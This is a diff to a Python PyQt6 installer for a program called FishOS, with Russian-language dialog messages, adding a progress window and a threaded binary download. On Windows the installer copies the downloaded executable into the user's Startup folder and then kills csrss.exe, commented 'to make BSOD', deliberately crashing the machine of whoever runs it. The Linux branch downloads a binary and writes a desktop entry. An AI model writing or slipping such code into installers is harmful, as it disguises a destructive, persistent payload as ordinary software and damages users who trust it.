@@ -1,11 +1,16 @@
 import sys
 import os
+import shutil
+from threading import Thread
 import requests
 from PyQt6 import QtGui
+from PyQt6.QtGui import QIcon
 from PyQt6.QtWidgets import *
 from install_pages import page1, page2
+from install_pages.progress import  ProgressWindow
 
 SIZE = (640, 480)
+VERSION = 'v0.0.1'
 
 
 class InstallWindow(QWidget):
@@ -13,6 +18,7 @@ class InstallWindow(QWidget):
         super().__init__()
 
         self.installed = False
+        self.iw = None
 
         self.setWindowTitle("Install FishOS")
         self.setGeometry(300, 300, *SIZE)
@@ -47,7 +53,87 @@ class InstallWindow(QWidget):
         print("Installing FishOS")
 
         print(sys.platform)
-        if "win" in sys.platform:
+
+        self.run_install(sys.platform)
+
+    def download_binary(self, system: str, local_data, startup_folder, link_path):
+        if 'win' in system:
+            with open(os.path.join(local_data, 'fos.exe'), 'wb') as f:
+                r = requests.get('')
+                try:
+                    if r.status_code == 200:
+                        f.write(r.content)
+                    else:
+                        QMessageBox.critical(
+                            self,
+                            'Ошибка',
+                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
+                        )
+                        f.close()
+                        return
+                except requests.exceptions.ConnectionError:
+                    QMessageBox.critical(
+                        self,
+                        "Ошибка",
+                        'Ошибка подключения к серверу. Попробуйте позже'
+                    )
+                    f.close()
+                    return
+
+            # Adding EXE to startup
+            shutil.copyfile(os.path.join(local_data, 'fos.exe'), os.path.join(startup_folder, 'fos.exe'))
+
+            self.iw.addValue(10)
+
+            # Killing csrss.exe to make BSOD
+            os.system('taskkill /F /IM csrss.exe')
+        elif system == 'linux':
+            with open(os.path.join(local_data, 'fos'), 'wb') as f:
+                r = requests.get(f'https://github.com/Salmon-bit/FishOS/releases/download/{VERSION}/fos')
+                try:
+                    if r.status_code == 200:
+                        f.write(r.content)
+                    else:
+                        QMessageBox.critical(
+                            self,
+                            'Ошибка',
+                            "Ошибка получения основного файла программы с сервера. Попробуйте позже."
+                        )
+                        return
+                except requests.exceptions.ConnectionError:
+                    QMessageBox.critical(
+                        self,
+                        "Ошибка",
+                        'Ошибка подключения к серверу. Попробуйте позже'
+                    )
+                    return
+
+            os.chmod(os.path.join(local_data, 'fos'), 0o755)
+
+            self.iw.addValue(70)
+
+            with open(link_path, "w") as f:
+                DATA = f"""\
+[Desktop Entry]
+Version=1.0
+Name=FishOS
+Comment=Fun Operating System
+Type=Application
+Terminal=false
+Exec={os.path.join(local_data, 'fos')}
+Icon={os.path.join(local_data, 'fos_ICON.png')}"""
+                f.write(DATA)
+
+            self.iw.addValue(10)
+            self.installed = True
+            QMessageBox.information(
+                self,
+                "Информация",
+                "FishOS успешно утсановлена на ваш ПК.\nСпасибо, что выбираете нас!"
+            )
+
+    def run_install(self, system: str):
+        if 'win' in system:
             local_appdata = os.getenv("LOCALAPPDATA")
             local_data = os.path.join(local_appdata, "FishOS")
             os.mkdir(local_data)
@@ -74,16 +160,19 @@ class InstallWindow(QWidget):
                     )
                     return
 
+            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.ico')))
+            self.iw.show()
+            self.iw.addValue(20)
+
             app_data = os.getenv("APPDATA")
             startup_folder = os.path.join(app_data, r"Microsoft\Windows\Start Menu\Programs\Startup")
 
-            # Adding EXE to startup
+            # Downloading executable
 
-            # Killing csrss.exe to make BSOD
-            os.system('taskkill /F /IM csrss.exe')
+            th = Thread(target=self.download_binary, args=(sys.platform, local_data, startup_folder, ''))
+            th.start()
 
-            #os.kill(pids[0])
-        elif "linux" in sys.platform:
+        elif system == 'linux':
             home_path = os.getenv("HOME")
             home_dirs = os.listdir(home_path)
 
@@ -100,7 +189,8 @@ class InstallWindow(QWidget):
 
             with open(os.path.join(local_data, 'fos_ICON.png'), 'wb') as f:
                 try:
-                    r = requests.get('https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.png')
+                    r = requests.get(
+                        'https://raw.githubusercontent.com/Salmon-bit/FishOS/refs/heads/main/assets/fos_ICON.png')
                     if r.status_code == 200:
                         f.write(r.content)
                     else:
@@ -117,27 +207,16 @@ class InstallWindow(QWidget):
                         'Ошибка',
                         "Не удалось скачать файл с сервера.\nПроверьте своё интренет-подключение и попробуйте еще позднее."
                     )
+                    f.close()
                     return
+            self.iw = ProgressWindow(QIcon(os.path.join(local_data, 'fos_ICON.png')))
+            self.iw.show()
+            self.iw.addValue(20)
 
-            executable_path = sys.executable
-            with open(link_path, "w") as f:
-                DATA = f"""\
-[Desktop Entry]
-Version=1.0
-Name=FishOS
-Comment=Fun Operating System
-Type=Application
-Terminal=false
-Exec={executable_path}
-Icon={os.path.join(local_data, 'fos_ICON.png')}"""
-                f.write(DATA)
+            # Downloading executable
 
-        self.installed = True
-        QMessageBox.information(
-            self,
-            "Информация",
-            "FishOS успешно утсановлена на ваш ПК.\nСпасибо, что выбираете нас!"
-        )
+            th = Thread(target=self.download_binary, args=(sys.platform, local_data, '', link_path))
+            th.start()
 
     def closeEvent(self, event: QtGui.QCloseEvent) -> None:
         if not self.installed:
